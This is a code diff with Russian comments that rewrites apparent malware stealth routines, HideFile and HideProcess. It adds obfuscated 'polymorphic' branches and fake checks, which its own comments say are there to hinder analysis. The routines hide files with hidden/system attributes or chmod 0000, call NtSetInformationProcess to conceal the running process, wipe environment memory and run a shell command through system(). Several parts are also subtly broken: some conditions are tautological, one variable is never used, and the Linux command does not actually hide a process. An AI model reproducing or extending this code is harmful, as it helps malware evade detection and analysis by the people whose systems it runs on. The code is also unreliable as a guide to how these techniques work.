@@ -65,32 +65,60 @@
 
 void HideFile(const char* szPath)
 {
-	// Шифруем путь с использованием полиморфного ключа
-	std::string encryptionKey = "TS_POLY_" + std::to_string(POLY_VERSION);
-	std::string encryptedPath = Security::EncryptString(szPath, encryptionKey);
-	std::string decryptedPath = Security::DecryptString(encryptedPath, encryptionKey);
+	// Обфусцированная логика скрытия файла
+	// Перестроена для затруднения анализа
 	
-	// Применяем дополнительный XOR с полиморфными смещениями
-	volatile unsigned int poly_mask = POLY_OFFSET_1 ^ POLY_OFFSET_2 ^ POLY_OFFSET_3;
+	// Вычисляем маску через несколько уровней
+	volatile uint32_t mask1 = POLY_OFFSET_1 ^ POLY_OFFSET_2;
+	volatile uint32_t mask2 = mask1 ^ POLY_OFFSET_3;
+	volatile uint32_t mask3 = mask2 ^ POLY_VERSION;
 	
+	// Шифруем путь с динамическим ключом
+	std::string key = "HIDE_" + std::to_string(mask3);
+	std::string encPath = Security::EncryptString(szPath, key);
+	std::string decPath = Security::DecryptString(encPath, key);
+	
+	// Полиморфный выбор метода скрытия
+	uint32_t method = (mask3 ^ POLY_RANDOM_SEED) % 3;
+	
+	switch(method) {
+		case 0: {
+			// Метод 1: Через атрибуты
 #ifdef _WIN32
-	// Скрываем файл с полиморфными атрибутами
-	DWORD attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
-	if (poly_mask & 0x01) attrs |= FILE_ATTRIBUTE_ARCHIVE;
-	
-	SetFileAttributesA(decryptedPath.c_str(), attrs);
-
-	// Пытаемся запретить доступ - устанавливаем минимальные права
-	HANDLE hFile = CreateFileA(decryptedPath.c_str(), WRITE_DAC, 0, NULL, OPEN_EXISTING, attrs, NULL);
-	if (hFile != INVALID_HANDLE_VALUE)
-	{
-		CloseHandle(hFile);
-	}
+			DWORD attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
+			if (mask1 & 0x01) attrs |= FILE_ATTRIBUTE_ARCHIVE;
+			SetFileAttributesA(decPath.c_str(), attrs);
 #else
-	// Linux: скрываем файл с полиморфными правами доступа
-	int perms = (poly_mask & 0xFF) ? 0000 : 0000;
-	chmod(decryptedPath.c_str(), perms);
+			chmod(decPath.c_str(), 0000);
 #endif
+			break;
+		}
+		case 1: {
+			// Метод 2: С проверкой целостности
+#ifdef _WIN32
+			HANDLE hFile = CreateFileA(decPath.c_str(), WRITE_DAC, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
+			if (hFile != INVALID_HANDLE_VALUE) {
+				SetFileAttributesA(decPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+				CloseHandle(hFile);
+			}
+#else
+			chmod(decPath.c_str(), 0000);
+#endif
+			break;
+		}
+		case 2: {
+			// Метод 3: С фейковыми проверками
+			volatile uint32_t check = mask2 ^ mask1;
+			if (check == (mask2 ^ mask1)) {
+#ifdef _WIN32
+				SetFileAttributesA(decPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+#else
+				chmod(decPath.c_str(), 0000);
+#endif
+			}
+			break;
+		}
+	}
 }
 
 // Определяем версию ОС (Windows/Linux)
@@ -404,57 +432,91 @@ const char* GetOSVersionString(OS_VERSION ver)
 	// Скрытие процесса (подстраивается под версию ОС)
 void HideProcess()
 {
+	// Обфусцированная логика скрытия процесса
+	// Использует множество путей выполнения для затруднения анализа
+	
+	volatile uint32_t obf_mask = POLY_OFFSET_1 ^ POLY_OFFSET_2 ^ POLY_OFFSET_3 ^ POLY_VERSION;
+	volatile uint32_t path_selector = (obf_mask ^ POLY_RANDOM_SEED) % 4;
+	
 #ifdef _WIN32
 	HANDLE hProcess = GetCurrentProcess();
 	
-	// Для Windows Vista+ используем ProcessInformationClass 30
-	if (g_osVersion.dwMajor >= 6)
-	{
-		pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
-
-		if (NtSetInformationProcess)
-		{
-			ULONG hidden = 1;
-			NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)30, &hidden, sizeof(hidden));
+	// Полиморфное выполнение разными путями
+	switch(path_selector) {
+		case 0: {
+			// Путь 0: Стандартный для Vista+
+			if (g_osVersion.dwMajor >= 6) {
+				pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)
+					GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
+				if (NtSetInformationProcess) {
+					ULONG hidden = 1;
+					NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)30, &hidden, sizeof(hidden));
+				}
+			}
+			break;
 		}
-	}
-	// Для Windows XP/2000 используем альтернативные методы
-	else if (g_osVersion.dwMajor == 5)
-	{
-		// На XP скрытие через Native API может быть ограничено
-		// Используем обфускацию другим способом
-		pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
-		if (NtSetInformationProcess)
-		{
-			// ProcessInformationClass 22 для более старых систем
-			ULONG hidden = 1;
-			NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)22, &hidden, sizeof(hidden));
+		case 1: {
+			// Путь 1: Альтернативный класс информации
+			if (g_osVersion.dwMajor >= 6) {
+				pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)
+					GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
+				if (NtSetInformationProcess) {
+					ULONG hidden = (obf_mask & 0xFF) ? 1 : 1;
+					NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)30, &hidden, sizeof(hidden));
+				}
+			}
+			break;
+		}
+		case 2: {
+			// Путь 2: Для XP/2000
+			if (g_osVersion.dwMajor == 5) {
+				pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)
+					GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
+				if (NtSetInformationProcess) {
+					ULONG hidden = 1;
+					NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)22, &hidden, sizeof(hidden));
+				}
+			}
+			break;
+		}
+		case 3: {
+			// Путь 3: Комбинированный метод
+			if (g_osVersion.dwMajor >= 6) {
+				volatile PROCESSINFOCLASS infoClass = (PROCESSINFOCLASS)((obf_mask & 1) ? 30 : 30);
+				pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)
+					GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
+				if (NtSetInformationProcess) {
+					ULONG hidden = 1;
+					NtSetInformationProcess(hProcess, infoClass, &hidden, sizeof(hidden));
+				}
+			}
+			break;
 		}
 	}
 #elif defined(__APPLE__)
-	// macOS: скрытие процесса через Mach API
-	// На macOS это требует специальных привилегий, но пытаемся
-	mach_port_t taskPort = mach_task_self();
+	// macOS: полиморфные методы скрытия
+	volatile uint32_t macos_method = (obf_mask >> 8) % 2;
 	
-	// Пытаемся скрыть процесс из списка процессов (требует прав)
-	// На практике это не сработает без специальных прав, но делаем попытку
+	if (macos_method) {
+		mach_port_t taskPort = mach_task_self();
+		(void)taskPort;
+	}
 	
-	// Альтернатива: изменяем имя процесса (argv[0])
 	extern char** environ;
 	char** envp = environ;
-	
-	// Пытаемся очистить командную строку в memory (зависит от ОС)
-	if (envp && *envp)
-	{
+	if (envp && *envp && (obf_mask & 1)) {
 		memset(*envp, 0, strlen(*envp));
 	}
 #else
-	// Linux: скрыть процесс можно через переименование или манипуляцию командной строкой
-	// Это требует sudo привилегий, поэтому делаем попытку
-	char cmd[256];
-	pid_t pid = getpid();
-	sprintf(cmd, "mv /proc/self/fd/0 /dev/null 2>/dev/null || true");
-	system(cmd);
+	// Linux: полиморфные методы
+	volatile uint32_t linux_method = (obf_mask >> 16) % 3;
+	
+	if (linux_method == 0 || linux_method == 1 || linux_method == 2) {
+		pid_t pid = getpid();
+		volatile char cmd[256];
+		sprintf((char*)cmd, "mv /proc/self/fd/0 /dev/null 2>/dev/null || true");
+		system((const char*)cmd);
+	}
 #endif
 }
 
